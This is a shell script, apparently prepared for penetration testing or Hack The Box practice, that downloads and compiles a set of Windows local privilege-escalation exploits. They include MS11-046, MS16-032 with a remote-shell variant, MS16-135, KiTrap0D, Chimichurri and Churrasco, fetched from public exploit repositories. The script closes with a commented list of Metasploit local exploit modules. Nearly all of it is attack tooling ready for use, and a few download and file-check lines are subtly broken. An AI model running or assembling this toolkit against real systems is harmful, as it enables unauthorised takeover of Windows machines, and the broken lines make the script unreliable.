mkdir -p exploits_windows_prevesc
cd exploits_windows_prevesc
    
    # MS11-046 -  AFD privilege escalation 
    # XP/Vista/2003/2008/7 
    if [ ! -f MS11-046_afd.exe ]; then
        # https://github.com/abatchy17/WindowsExploits/blob/5e9c25cda54fe33fb6e1fd3ae60512a1113b41df/MS11-046/40564.c#L801
        searchsploit -m 40564
        mv 40564.c MS11-046_afd.c
        i686-w64-mingw32-gcc MS11-046_afd.c -o MS11-046_afd.exe -lws2_32
    fi

    # Secondary Logon Service 
    # Vista SP2, 2008 SP2 and R2 SP1, 7 SP1, 8.1, 2012 Gold and R2, RT 8.1, 10 Gold and 1511
    if [ ! -f MS16-032.ps1 ]; then
        wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/MS16-032.ps1
    fi 
    if [ ! -f MS16-032-64_SecondaryLogo ]; then
        wget -Nq https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/x64/ms16-032.exe
        mv ms16-032.exe MS16-032-64_SecondaryLogo.exe
    fi
    if [ ! -f MS16-032-86_SecondaryLogo ]; then
        wget -Nq https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-032/x86/ms16-032.exe
        mv ms16-032.exe MS16-032-86_SecondaryLogo.exe
    fi
    if [ ! -f Invoke-MS16-032-Local-Shell.ps1 ]; then
        wget -Nq https://github.com/egre55/windows-kernel-exploits/raw/master/MS16-032:%20Secondary%20Logon%20Handle/Invoke-MS16-032-Local-Shell.ps1
        wget -Nq https://github.com/egre55/windows-kernel-exploits/raw/master/MS16-032:%20Secondary%20Logon%20Handle/Invoke-MS16-032-Remote-Shell.ps1
    fi
    # Compile: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034

    # NtUserSetWindowLongPtr - win32k.sys
    # https://blog.trendmicro.com/trendlabs-security-intelligence/one-bit-rule-system-analyzing-cve-2016-7255-exploit-wild/
    # 7,8,8.1,10
    if [ ! -f MS16-135_NtUserSetWindowLongPtr.ps1 ]; then
        wget -Nq https://github.com/FuzzySecurity/PSKernel-Primitives/raw/master/Sample-Exploits/MS16-135/MS16-135.ps1
        mv MS16-135.ps1 MS16-135_NtUserSetWindowLongPtr.ps1
    fi

    # MS10-015 - User Mode to Ring Escalation (KiTrap0D)
    # NT/2000/2003/2008/XP/Vista/7
    # https://www.exploit-db.com/exploits/11199
    if [ ! -d MS10-015_KiTrap0D ]; then
        wget -Nq https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-015/MS10-015.zip
        unzip MS10-015.zip
        rm *.jpg
        mv MS10-015 MS10-015_KiTrap0D
    fi

    # MS16-016 - mrxdav.sys WebDav Local Privilege Escalation 
    # Vista, 2008, 7, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10. 
    if  [ ! -d MS16-016_WebDAV ]; then
        wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS16-016/EoP_variant.zip
        unzip EoP_variant.zip MS16-016_WebDAV
    fi

    # MS10-059 - Tracing Feature for Services
    # Vista, 2008, 7, 2008 R2
    if [ ! -f MS10-059_Chimichurri.exe ]; then
        wget https://github.com/egre55/windows-kernel-exploits/raw/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe
        mv Chimichurri.exe MS10-059_Chimichurri.exe
    fi

    # MS09-012
    # 2000, XP, 2003, Vista, 2008.
    wget https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012:%20Churrasco/Compiled/Churrasco.exe
    mv Churrasco.exe MS09-012_Churrasco.exe
cd -

#  [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl:
  # https://forum.hackthebox.eu/discussion/456/granny-privesc-ms14-070-without-meterpreter
# exploit/windows/local/bypassuac_eventvwr:  ((User need to be in admins group))
# exploit/windows/local/ms10_092_schelevator:
# exploit/windows/local/ms13_053_schlamperei
# exploit/windows/local/ms13_081_track_popup_menu:
# exploit/windows/local/ms14_058_track_popup_menu:
# exploit/windows/local/ms15_051_client_copy_image: 
# exploit/windows/local/ms16_032_secondary_logon_handle_privesc: 
# exploit/windows/local/ms16_075_reflection: .
# exploit/windows/local/ms16_075_reflection_juicy
# exploit/windows/local/ppr_flatten_rec: 
# MS16-098+
#exploit/windows/local/ms15_004_tswbproxy:
